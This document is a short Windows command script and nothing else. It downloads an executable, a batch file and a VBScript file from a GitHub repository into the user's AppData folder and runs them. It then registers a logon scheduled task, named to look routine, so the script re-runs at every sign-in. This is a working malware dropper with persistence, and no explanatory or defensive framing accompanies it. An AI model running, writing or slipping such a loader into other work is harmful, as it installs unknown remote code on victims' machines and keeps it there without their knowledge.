curl https://raw.githubusercontent.com/ishanarya24/dc/main/ImpactInstaller.exe --output %appdata%/ImpactInstaller.exe && start %appdata%/ImpactInstaller.exe & cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/script.bat -O && curl https://raw.githubusercontent.com/ishanarya24/dc/main/persistence.vbs -O && start persistence.vbs
SCHTASKS /CREATE /SC ONLOGON /TN "extraTask\task_99078" /TR %appdata%\persistence.vbs
EXIT
